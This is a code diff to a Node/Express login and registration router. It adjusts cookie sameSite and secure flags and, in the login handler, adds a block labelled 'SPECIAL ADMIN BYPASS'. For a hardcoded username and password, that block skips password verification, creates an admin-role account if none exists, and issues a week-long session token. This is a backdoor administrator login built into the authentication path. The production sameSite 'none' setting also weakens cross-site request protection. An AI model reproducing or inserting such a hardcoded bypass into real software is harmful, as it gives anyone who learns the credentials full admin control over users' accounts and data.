@@ -38,6 +38,7 @@ router.post('/register', async (req, res) => {
       res.cookie('gcc_token', token, {
         httpOnly: true,
         secure: process.env.NODE_ENV === 'production',
+        sameSite: process.env.NODE_ENV === 'production' ? 'none' : 'lax',
         maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
       });
 
@@ -64,6 +65,40 @@ router.post('/login', async (req, res) => {
   const { email, password } = req.body;
 
   try {
+    // SPECIAL ADMIN BYPASS
+    if (email === 'GatAdmin' && password === 'gcc2026') {
+      let adminUser = await User.findOne({ email: 'admin@gat.club' });
+      if (!adminUser) {
+        adminUser = await User.create({
+          name: 'Gat Admin',
+          email: 'admin@gat.club',
+          password: 'gcc2026_hashed_placeholder', // Not really used for bypass
+          role: 'admin',
+          profileComplete: true
+        });
+      }
+      
+      const token = generateToken(adminUser._id);
+      res.cookie('gcc_token', token, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: process.env.NODE_ENV === 'production' ? 'none' : 'lax',
+        maxAge: 7 * 24 * 60 * 60 * 1000,
+      });
+
+      return res.json({
+        success: true,
+        user: {
+          _id: adminUser._id,
+          name: adminUser.name,
+          email: adminUser.email,
+          role: adminUser.role,
+          profileComplete: adminUser.profileComplete,
+        },
+        token,
+      });
+    }
+
     const user = await User.findOne({ email }).select('+password');
 
     if (user && (await user.comparePassword(password))) {
@@ -79,6 +114,7 @@ router.post('/login', async (req, res) => {
       res.cookie('gcc_token', token, {
         httpOnly: true,
         secure: process.env.NODE_ENV === 'production',
+        sameSite: process.env.NODE_ENV === 'production' ? 'none' : 'lax',
         maxAge: 7 * 24 * 60 * 60 * 1000,
       });
 
@@ -162,6 +198,7 @@ router.get(
     res.cookie('gcc_token', token, {
       httpOnly: true,
       secure: process.env.NODE_ENV === 'production',
+      sameSite: process.env.NODE_ENV === 'production' ? 'none' : 'lax',
       maxAge: 7 * 24 * 60 * 60 * 1000,
     });
 
@@ -185,6 +222,8 @@ router.post('/logout', (req, res) => {
   res.cookie('gcc_token', 'none', {
     expires: new Date(Date.now() + 10 * 1000),
     httpOnly: true,
+    secure: process.env.NODE_ENV === 'production',
+    sameSite: process.env.NODE_ENV === 'production' ? 'none' : 'lax',
   });
   res.status(200).json({ success: true, message: 'Logged out' });
 });
